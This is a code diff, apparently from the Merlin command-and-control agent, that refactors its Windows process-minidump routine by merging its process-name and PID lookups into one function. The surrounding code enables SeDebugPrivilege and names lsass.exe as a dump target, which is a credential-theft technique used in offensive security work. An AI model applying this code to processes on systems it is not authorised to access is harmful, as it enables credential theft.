@@ -20,7 +20,6 @@
 package agent
 
 import (
-	"github.com/Ne0nd0g/merlin/pkg/modules"
 	// Standard
 	"errors"
 	"fmt"
@@ -35,6 +34,9 @@ import (
 
 	// 3rd Party
 	"github.com/mattn/go-shellwords"
+
+	// Merlin
+	"github.com/Ne0nd0g/merlin/pkg/modules"
 )
 
 const (
@@ -397,21 +399,9 @@ func miniDump(tempDir string, process string, inPid uint32) (modules.MinidumpFil
 	}
 
 	// Get the process PID or name
-	if inPid != 0 {
-		ret.ProcName, err = getProcName(inPid)
-		if err != nil {
-			return ret, err
-		}
-		ret.ProcID = inPid
-	} else if process != "" {
-		ret.ProcID, err = getProcID(process)
-		if err != nil {
-			return ret, err
-		}
-		ret.ProcName = process
-
-	} else {
-		return ret, fmt.Errorf("an valid process ID or name was not provided")
+	ret.ProcName, ret.ProcID, err = getProcess(process, inPid)
+	if err != nil {
+		return ret, err
 	}
 
 	// Get debug privs (required for dumping processes not owned by current user)
@@ -466,77 +456,54 @@ func miniDump(tempDir string, process string, inPid uint32) (modules.MinidumpFil
 	return ret, nil
 }
 
-//getProcID returns the PID of the provided process name (eg lsass.exe). PID of < 1 indicates didn't find the process.
-func getProcID(procname string) (uint32, error) {
+// getProcess takes in a process name OR a process ID and returns a pointer to the process handle, the process name,
+// and the process ID.
+func getProcess(name string, pid uint32) (string, uint32, error) {
 	//https://github.com/mitchellh/go-ps/blob/master/process_windows.go
-	handle, err := syscall.CreateToolhelp32Snapshot(0x00000002, 0)
-	if handle < 0 || err != nil {
-		return 0, fmt.Errorf("Could not get snapshot:\n%s", err)
-	}
-	defer syscall.CloseHandle(handle)
 
-	var entry syscall.ProcessEntry32
-	entry.Size = uint32(unsafe.Sizeof(entry))
-	err = syscall.Process32First(handle, &entry)
+	if pid <= 0 && name == "" {
+		return "", 0, fmt.Errorf("a process name OR process ID must be provided")
+	}
+
+	snapshotHandle, err := syscall.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+	if snapshotHandle < 0 || err != nil {
+		return "", 0, fmt.Errorf("there was an error creating the snapshot:\r\n%s", err)
+	}
+	defer syscall.CloseHandle(snapshotHandle)
+
+	var process syscall.ProcessEntry32
+	process.Size = uint32(unsafe.Sizeof(process))
+	err = syscall.Process32First(snapshotHandle, &process)
 	if err != nil {
-		return 0, fmt.Errorf("Could not process the handle:\n%s", err)
+		return "", 0, fmt.Errorf("there was an accessing the first process in the snapshot:\r\n%s", err)
 	}
 
 	for {
-		s := ""
-		for _, chr := range entry.ExeFile {
+		processName := ""
+		// Iterate over characters to build a full string
+		for _, chr := range process.ExeFile {
 			if chr != 0 {
-				s = s + string(int(chr))
+				processName = processName + string(int(chr))
 			}
 		}
-		if s == procname {
-			return entry.ProcessID, nil
+		if pid > 0 {
+			if process.ProcessID == pid {
+				return processName, pid, nil
+			}
+		} else if name != "" {
+			if processName == name {
+				return name, process.ProcessID, nil
+			}
 		}
-		err = syscall.Process32Next(handle, &entry)
+		err = syscall.Process32Next(snapshotHandle, &process)
 		if err != nil {
 			break
 		}
 	}
-	return 0, fmt.Errorf("Could not find a procces with the supplied name \"%s\"", procname)
+	return "", 0, fmt.Errorf("could not find a procces with the supplied name \"%s\" or PID of \"%d\"", name, pid)
 }
 
-//getProcName will return the name of the process associated with the specified pid.
-func getProcName(pid uint32) (string, error) {
-	//https://github.com/mitchellh/go-ps/blob/master/process_windows.go
-	handle, err := syscall.CreateToolhelp32Snapshot(
-		0x00000002,
-		0)
-	if handle < 0 || err != nil {
-		return "", fmt.Errorf("Could not get snapshot:\n%s", err)
-	}
-	defer syscall.CloseHandle(handle)
-
-	var entry syscall.ProcessEntry32
-	entry.Size = uint32(unsafe.Sizeof(entry))
-	err = syscall.Process32First(handle, &entry)
-	if err != nil {
-		return "", fmt.Errorf("Could not process the handle:\n%s", err)
-	}
-
-	for {
-		s := ""
-		for _, chr := range entry.ExeFile {
-			if chr != 0 {
-				s = s + string(int(chr))
-			}
-		}
-		if entry.ProcessID == pid {
-			return s, nil
-		}
-		err = syscall.Process32Next(handle, &entry)
-		if err != nil {
-			break
-		}
-	}
-	return "", fmt.Errorf("Could not find PID \"%d\"", pid)
-}
-
-//sePrivEnable adjusts the privileges of the current process to add the passed in string. Good for setting 'SeDebugPrivilege'
+// sePrivEnable adjusts the privileges of the current process to add the passed in string. Good for setting 'SeDebugPrivilege'
 func sePrivEnable(s string) error {
 	type LUID struct {
 		LowPart  uint32
